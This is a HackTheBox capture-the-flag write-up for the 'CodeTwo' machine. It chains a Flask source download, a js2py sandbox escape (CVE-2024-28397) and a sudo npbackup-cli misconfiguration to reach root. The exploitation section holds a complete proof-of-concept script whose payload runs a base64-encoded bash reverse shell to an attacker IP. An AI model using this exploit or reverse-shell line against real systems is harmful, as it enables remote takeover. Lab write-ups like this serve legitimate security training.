# CodeTwo — HackTheBox Writeup

**Machine IP:** `10.10.11.xxx`
**Difficulty:** easy
**Category:** JS Sandbox Escape | Flask App | Privilege Escalation (npbackup)
**Author:** Mridul Chamoli

---

## 🟢 Introduction

CodeTwo is a Flask-based HTB machine vulnerable to:

* Source code disclosure via a **/download** endpoint
* **CVE-2024-28397** — js2py sandbox escape → remote code execution
* Credential extraction from SQLite
* Privilege escalation through **npbackup-cli** (run as root without password)

This machine focuses heavily on understanding JS sandbox escapes and abusing backup utilities for full system compromise.

---

## 🔍 Reconnaissance

Initial nmap scan:

```bash
thanatos@kali:/home/thanatos/Desktop/htb/machines/codetwo$ nmap codetwo.htb -A
```

### 🧩 Results

* **22/tcp** — SSH — OpenSSH 8.2p1 Ubuntu
* **8000/tcp** — HTTP — gunicorn/Flask app

Browsing `http://codetwo.htb:8000` leads to a custom coding platform written in Flask.

---

## 📥 Source Code Download

The `/download` endpoint returns a ZIP containing the full application source:

```python
@app.route('/download')
def download():
    return send_from_directory('/home/app/app/static/', 'app.zip')
```

Unzipping the contents reveals the complete Flask backend, including routes, database files, and — most importantly — the unsafe `/run_code` endpoint.

---

## 🚨 Vulnerable Endpoint — `/run_code`

This function directly evaluates untrusted JavaScript using **js2py.eval_js()**:

```python
@app.route('/run_code', methods=['POST'])
def run_code():
    code = request.json.get('code')
    result = js2py.eval_js(code)
    return jsonify({'result': result})
```

This is vulnerable to **CVE-2024-28397** — js2py sandbox escape → Python object traversal → subprocess.Popen RCE.

---

## 💣 Exploitation — CVE-2024-28397 js2py Sandbox Escape

Public research shows how to escape js2py by navigating Python internals.

PoC used:

```python
import requests, json
url = 'http://codetwo.htb:8000/run_code'

js_code = """
let cmd = "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTYuNTYvNDQ0NCAwPiYxKSAm|base64 -d|bash";
let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__;
let obj = a(a(a,"__class__"), "__base__");
function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i];
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item;
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result;
        }
    }
}
let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
result;
"""

payload = {"code": js_code}
r = requests.post(url, data=json.dumps(payload), headers={"Content-Type": "application/json"})
print(r.text)
```

Once executed, it returns a **reverse shell**.

---

## 🐚 Initial Foothold — www-data

After receiving shell:

```bash
www-data@codetwo:~/app$
```

Inside the app directory, we find:

* SQLite DB: `/home/app/app/instance/users.db`

Cracking the hash reveals:

```
marco : <plaintext_password>
```

SSH into the system:

```bash
ssh marco@codetwo.htb
```

User flag found in Marco’s home folder.

---

## 🔼 Privilege Escalation — npbackup-cli

Marco can run **npbackup-cli** as root without password:

```bash
sudo -l
(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

Reading the documentation shows that custom config files can be supplied:

```bash
sudo npbackup-cli -c npbackup.conf -b -f
```

The configuration file is editable by Marco.

---

## 🛠️ Exploiting npbackup — Back Up /root

Inside Marco’s home directory:

```bash
cat npbackup.conf
```

Modify the backup source:

```yaml
paths:
  - /root
```

Run forced backup:

```bash
sudo npbackup-cli -c npbackup.conf -b -f
```

The resulting backup contains full `/root` directory contents.

Extract and read:

```bash
tar -xf root_backup.tar.gz
cat root/root.txt
```

Root flag acquired.

Additionally, SSH private keys for root can also be recovered.

---

## 🏁 Root Flag

Root flag located in:

```
/root/root.txt
```

---

## 🎉 Conclusion

CodeTwo teaches multiple valuable exploitation techniques:

* Enumerating Flask applications
* Exploiting js2py sandbox escape (CVE-2024-28397)
* Leveraging misconfigured backup tools for root escalation

A fun machine with a real-world vulnerability chain.

**Machine pwned!** 🔥🐚
